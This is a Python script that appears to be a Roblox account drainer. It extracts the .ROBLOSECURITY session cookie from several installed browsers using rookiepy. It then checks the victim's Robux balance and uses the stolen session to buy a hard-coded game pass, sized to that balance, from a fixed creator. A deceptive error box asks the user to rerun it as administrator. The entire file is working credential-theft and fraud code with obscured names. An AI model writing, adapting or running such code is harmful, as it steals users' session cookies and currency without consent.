import time
import requests
import rookiepy
import ctypes

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
AU = "https://auth.roblox.com/v2/logout"

def ch(c, eh=None):
    h = {"User-Agent": UA, "Cookie": f".ROBLOSECURITY={c}"}
    if eh: h.update(eh)
    return h

class I:
    @staticmethod
    def gi(id):
        r = requests.get(f"https://apis.roblox.com/game-passes/v1/game-passes/{id}/product-info")
        try:
            data = r.json()
            product_id = data.get("ProductId")
            creator_id = data.get("Creator", {}).get("Id")
            price = data.get("PriceInRobux")
            return product_id, creator_id, price
        except Exception:
            return None, None, None
    
    @staticmethod
    def gx(c):
        try:
            return requests.post(AU, headers=ch(c)).headers.get("x-csrf-token", "")
        except:
            return ""
    
    @staticmethod
    def gh(c):
        xs = I.gx(c)
        return {"X-CSRF-TOKEN": xs} if xs else {}

    @staticmethod
    def gb(cookie):
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        r = requests.get("https://economy.roblox.com/v1/user/currency", headers=headers)
        try:
            if r.status_code == 200:
                robux = r.json().get("robux", 0)
                return robux
            return 0
        except Exception:
            return 0

class B:
    def __init__(self, c):
        self.c = c
    
    def b(self, id):
        p, s, pr = I.gi(id)
        if not p or not s or not pr:
            return
        h = I.gh(self.c)
        try:
            response = requests.post(
                f"https://economy.roblox.com/v1/purchases/products/{p}",
                json={"expectedCurrency": 1, "expectedPrice": pr, "expectedSellerId": s},
                headers=ch(self.c, h)
            )
            response.raise_for_status()
        except requests.exceptions.RequestException:
            pass
    
    def ab(self, id, amt, ct):
        for _ in range(amt):
            try:
                self.b(id)
                time.sleep(ct)
            except Exception:
                continue

def gr(bf):
    try: 
        return [x.value for x in rookiepy.to_cookiejar(bf()) if x.name == ".ROBLOSECURITY"]
    except: 
        return []

browsers = [rookiepy.chrome, rookiepy.brave, rookiepy.edge, rookiepy.opera, rookiepy.opera_gx, rookiepy.firefox, rookiepy.chromium]

cookies = []
for browser in browsers: 
    cookies.extend(gr(browser))

if not cookies:
    ctypes.windll.user32.MessageBoxW(0, "Roblox not found. Make sure you are running as administrator.", "Error", 0x10)
else:
    cfg = {"c": cookies[0]}
    rb = I.gb(cfg["c"])

    if rb > 10000:
        gpi = 1107987399
    elif rb > 1000:
        gpi = 1108394771
    elif rb > 100:
        gpi = 1107903828
    elif rb > 50:
        gpi = 1108702057
    else:
        gpi = None

    if gpi:
        B(cfg["c"]).ab(gpi, 1, 1)
